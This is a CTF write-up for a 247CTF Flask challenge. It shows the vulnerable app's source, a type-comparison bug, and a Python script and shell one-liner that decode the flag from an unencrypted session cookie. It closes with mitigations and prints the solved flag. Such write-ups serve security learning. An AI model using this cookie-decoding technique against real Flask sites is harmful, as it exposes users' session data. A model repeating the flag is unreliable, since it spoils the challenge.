# CTF Write-up: Flask Secret Key Challenge

**Challenge Name:** Flask Secret Key Guessing  
**Challenge Platform:** 247CTF  
**Challenge Type:** Web Security / Flask Exploitation  
**Difficulty:** Easy  
**Flag:** `247CTF{da80795f8a5cab2e037d7385807b9a91}`

## Challenge Overview
The challenge presents a vulnerable Flask web application where users are prompted to guess a random secret key to retrieve the flag.
The application's source code is provided on the homepage.

## Initial Reconnaissance

**Step 1: Access the application**
```
https://8245e8315f554816.247ctf.com/
```

**Step 2: Review the source code**
The root route displays the complete source code:

```python
import os
from flask import Flask, request, session
from flag import flag

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

def secret_key_to_int(s):
    try:
        secret_key = int(s)
    except ValueError:
        secret_key = 0
    return secret_key

@app.route("/flag")
def index():
    secret_key = secret_key_to_int(request.args['secret_key']) if 'secret_key' in request.args else None
    session['flag'] = flag
    if secret_key == app.config['SECRET_KEY']:
        return session['flag']
    else:
        return "Incorrect secret key!"

@app.route('/')
def source():
    return "%s" % open(__file__).read()
```

## Vulnerability Analysis

### Critical Flaw 1: Type Comparison Bug
```python
app.config['SECRET_KEY'] = os.urandom(24)  # Returns bytes object
secret_key = secret_key_to_int(...)        # Returns integer
if secret_key == app.config['SECRET_KEY']: # bytes == int → Always False
```

**Analysis:**
- `os.urandom(24)` generates a 24-byte cryptographically secure random sequence
- `secret_key_to_int()` converts user input to an integer (or 0 on failure)
- In Python, comparing `bytes == int` always returns `False`
- This makes the secret key impossible to guess through the intended method

### Critical Flaw 2: Client-Side Session Storage
```python
session['flag'] = flag  # Flag is stored in session before check
```

**Analysis:**
- Flask uses client-side sessions by default
- Session data is serialized, signed with the secret key, and stored in cookies
- The flag is stored in the session regardless of whether the secret key check passes
- Even though the session is signed to prevent tampering, it's not encrypted

## Exploitation Strategy

Since the flag is stored in the session cookie, we can decode it to retrieve the flag without needing to guess the secret key.

### Step-by-Step Exploitation

**Step 1: Access the /flag endpoint to get a session cookie**
```
GET https://8245e8315f554816.247ctf.com/flag
```

**Step 2: Extract the session cookie from the response**
The server sets a session cookie:
```
session=eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0.aYTYkw.FoHLCZcI6q9WgDllxkI1YfK0NN4
```

**Step 3: Analyze Flask session structure**
Flask sessions follow the format: `{data}.{timestamp}.{signature}`

**Step 4: Decode the session data**

Using command line:
```bash
# Extract the data part (before first dot)
DATA="eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0"

# Base64 decode (URL-safe)
echo $DATA | base64 -d
# Output: {"flag":{" b":"TWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0"}}
```

**Step 5: Extract and decode the flag**
The flag is double base64 encoded:

```bash
# Extract the inner base64 string
INNER_B64="TWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0"

# First base64 decode
echo $INNER_B64 | base64 -d
# Output: MjQ3Q1RGe2RhODA3OTVmOGE1Y2FiMmUwMzdkNzM4NTgwN2I5YTkxfQ==

# Second base64 decode to get the flag
echo "MjQ3Q1RGe2RhODA3OTVmOGE1Y2FiMmUwMzdkNzM4NTgwN2I5YTkxfQ==" | base64 -d
# Output: 247CTF{da80795f8a5cab2e037d7385807b9a91}
```

## Alternative One-Liner Solution
```bash
echo "eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0" | base64 -d 2>/dev/null | grep -o 'TWpRM1Ex[^"]*' | base64 -d | base64 -d
```

## Python Exploit Script
```python
#!/usr/bin/env python3
import base64
import json
import requests

url = "https://8245e8315f554816.247ctf.com/flag"

# Get session cookie
response = requests.get(url)
session_cookie = response.cookies.get('session')

if not session_cookie:
    print("No session cookie found!")
    exit(1)

# Extract data part
data_part = session_cookie.split('.')[0]

# Add padding if needed
if len(data_part) % 4:
    data_part += '=' * (4 - len(data_part) % 4)

# Decode base64
decoded = base64.urlsafe_b64decode(data_part)
session_data = json.loads(decoded)

# Extract and decode the flag (double base64 encoded)
encoded_flag = session_data['flag'][' b']
first_decode = base64.b64decode(encoded_flag)
flag = base64.b64decode(first_decode).decode()

print(f"Flag: {flag}")
```

## Root Cause Analysis

1. **Improper Session Usage:** The application stores sensitive data (flag) in client-side sessions
2. **Lack of Encryption:** Flask sessions are signed but not encrypted, allowing anyone to decode and read the contents
3. **Type Mismatch Vulnerability:** The comparison between bytes and integer objects creates an unreachable code path
4. **Information Disclosure:** Sensitive data should never be stored in client-side storage

## Mitigation Strategies

1. **Server-Side Sessions:**
   ```python
   from flask_session import Session
   app.config['SESSION_TYPE'] = 'filesystem'  # or 'redis', 'memcached'
   Session(app)
   ```

2. **Type-Safe Comparisons:**
   ```python
   # Compare same types
   if isinstance(secret_key, bytes) and secret_key == app.config['SECRET_KEY']:
   ```

3. **Avoid Client-Side Storage for Sensitive Data:**
   ```python
   # Store flag in server-side variable, not session
   if secret_key == app.config['SECRET_KEY']:
       return flag  # Direct return, no session storage
   ```

4. **Session Security Settings:**
   ```python
   app.config['SESSION_COOKIE_HTTPONLY'] = True
   app.config['SESSION_COOKIE_SECURE'] = True
   app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
   ```

## Key Takeaways

1. **Client-side sessions ≠ secure storage:** Just because data is signed doesn't mean it's encrypted or private
2. **Type matters in comparisons:** Always ensure type consistency in security-critical comparisons
3. **Defense in depth:** Never rely on a single security mechanism
4. **Least privilege:** Only store what's absolutely necessary in client-side storage
5. **Code review importance:** Such type mismatch bugs can be caught during code review

## Flag
`247CTF{da80795f8a5cab2e037d7385807b9a91}`

## Tools Used
- Web browser (for initial access)
- Command line utilities (base64, echo)
- Python (for automated exploitation)
- curl (alternative for HTTP requests)

## Time to Solve
- **Initial analysis:** 3-5 minutes
- **Exploitation:** 2-3 minutes
- **Verification:** 1-2 minutes
- **Total:** 6-10 minutes

## Difficulty Justification
**Easy** - The vulnerability is clearly visible in the source code, and Flask session decoding is a well-known technique in CTF challenges.
The double base64 encoding adds a slight twist but follows predictable patterns common in CTF challenges.
